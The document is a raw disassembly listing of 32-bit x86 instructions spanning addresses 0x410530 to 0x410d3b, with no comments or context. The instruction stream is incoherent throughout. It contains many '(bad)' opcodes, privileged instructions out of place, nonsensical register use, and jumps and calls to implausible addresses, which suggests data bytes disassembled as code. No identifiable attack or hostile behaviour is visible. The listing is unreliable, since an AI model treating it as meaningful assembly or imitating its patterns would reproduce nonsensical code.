  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
